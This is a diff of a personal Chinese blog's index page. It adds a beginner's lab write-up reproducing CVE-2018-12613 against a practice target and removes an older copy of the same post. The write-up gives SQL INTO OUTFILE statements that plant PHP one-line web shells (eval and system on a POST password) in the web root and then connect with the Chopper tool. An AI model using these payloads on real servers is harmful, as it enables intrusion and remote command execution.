@@ -211,6 +211,88 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-cve漏洞复现" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/27/cve漏洞复现/" class="article-date">
+  	<time datetime="2019-03-27T02:18:10.000Z" itemprop="datePublished">2019-03-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/27/cve漏洞复现/">
+        CVE-2018-12613漏洞复现
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>第一次玩认真的玩漏洞，感觉比平时学习学的快了好多，虽然好多都是借鉴的别人的，但自己也从中学到了很多，找到了其中的乐趣。</strong></p>
+<h1 id="靶机链接"><a href="#靶机链接" class="headerlink" title="靶机链接"></a>靶机链接</h1><p><a href="https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe</a></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>  因为是第一次做这样的题，看了两个小时一直是一脸懵逼，研究了一会之后就没有了兴趣，就迫不及待的去看别人的解题思路，对于我这种还没有学过sql注入的，看了一下别人的解题思路依旧是一脸懵逼，因此只能去百度了一下数据库的常用命令。首先我通过命令<br><em>数据库命令：<a href="http://blog.sina.com.cn/s/blog_4c197d420101aywx.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_4c197d420101aywx.html</a></em></p>
+<blockquote>
+<p>show variables like ‘datadir’<br>即查看数据库的物理路径，通过这个命令返回了一个路径，如下图：</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/03/26/5c9a1fa5933a4.png" alt=""></p>
+<p>  通过得到的路径，我们可以知道这个是Linux上的，在Linux上网站的默认目录是<strong>/var/www/html/</strong>，因此就可以用一句话木马注入：</p>
+<blockquote>
+<p>Select “&lt;?php @eval($_POST[password]);?&gt;” INTO OUTFILE “/&gt;var/www/html/password.php”</p>
+</blockquote>
+<p><img src="https://i.loli.net/2019/03/26/5c9a27f503b54.png" alt=""><br>显示如图所示，表示注入成功。</p>
+<h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p>注入成功之后就可以使用菜刀连接，如图所示：<br><img src="https://i.loli.net/2019/03/26/5c9a297866139.png" alt=""></p>
+<p><strong>注意箭头所指的地方是自己注入的时候所用的文件名和密码！</strong></p>
+<p>  添加成功之后就可以在目录下找到key.txt:<br><img src="https://i.loli.net/2019/03/26/5c9a2a3764bbe.png" alt=""></p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>SQL写一句话（MySQL）</p>
+<blockquote>
+<p>select “&lt;?php @system($_POST[“password”]);?&gt;” into outfile “/file.php”<br>前面是一句话内容,password为连接菜刀密码，后面是绝对路径www下的PHP文件，即注入路径。</p>
+</blockquote>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h1 id="END"><a href="#END" class="headerlink" title="END!"></a>END!</h1>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        
+<div class="counter-tag counter">
+    <span id="/2019/03/27/cve漏洞复现/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="CVE-2018-12613漏洞复现">
+         &nbsp;
+        view
+    </span>
+</div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-strip用法" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
@@ -857,84 +939,6 @@
         
 <div class="counter-tag counter">
     <span id="/2019/01/15/title/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="My first blog">
-         &nbsp;
-        view
-    </span>
-</div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-漏洞复现" class="article article-type-post" itemscope="" itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2019/01/15/漏洞复现/" class="article-date">
-  	<time datetime="2019-01-15T07:41:18.000Z" itemprop="datePublished">2019-01-15</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/15/漏洞复现/">
-        CVE-2018-12613漏洞复现
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>第一次玩认真的玩漏洞，感觉比平时学习学的快了好多，虽然好多都是借鉴的别人的，但自己也从中学到了很多，找到了其中的乐趣。</strong></p>
-<h1 id="靶机链接"><a href="#靶机链接" class="headerlink" title="靶机链接"></a>靶机链接</h1><p><a href="https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/RDM4VFA0aHFWT25Na09mdmhqcklxdz09bW96aGUmozhe</a></p>
-<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>  因为是第一次做这样的题，看了两个小时一直是一脸懵逼，研究了一会之后就没有了兴趣，就迫不及待的去看别人的解题思路，对于我这种还没有学过sql注入的，看了一下别人的解题思路依旧是一脸懵逼，因此只能去百度了一下数据库的常用命令。首先我通过命令<br><em>数据库命令：<a href="http://blog.sina.com.cn/s/blog_4c197d420101aywx.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_4c197d420101aywx.html</a></em></p>
-<blockquote>
-<p>show variables like ‘datadir’<br>即查看数据库的物理路径，通过这个命令返回了一个路径，如下图：</p>
-</blockquote>
-<p><img src="https://i.loli.net/2019/03/26/5c9a1fa5933a4.png" alt=""></p>
-<p>  通过得到的路径，我们可以知道这个是Linux上的，在Linux上网站的默认目录是<strong>/var/www/html/</strong>，因此就可以用一句话木马注入：</p>
-<blockquote>
-<p>Select “&lt;?php @eval($_POST[password]);?&gt;” INTO OUTFILE “/&gt;var/www/html/password.php”</p>
-</blockquote>
-<p><img src="https://i.loli.net/2019/03/26/5c9a27f503b54.png" alt=""><br>显示如图所示，表示注入成功。</p>
-<h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p>注入成功之后就可以使用菜刀连接，如图所示：<br><img src="https://i.loli.net/2019/03/26/5c9a297866139.png" alt=""></p>
-<p><strong>注意箭头所指的地方是自己注入的时候所用的文件名和密码！</strong></p>
-<p>  添加成功之后就可以在目录下找到key.txt:<br><img src="https://i.loli.net/2019/03/26/5c9a2a3764bbe.png" alt=""></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h1 id="END"><a href="#END" class="headerlink" title="END!"></a>END!</h1>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        
-<div class="counter-tag counter">
-    <span id="/2019/01/15/漏洞复现/" class="leancloud_visitors post-title-link" style="font-size: 12px" data-flag-title="CVE-2018-12613漏洞复现">
          &nbsp;
         view
     </span>
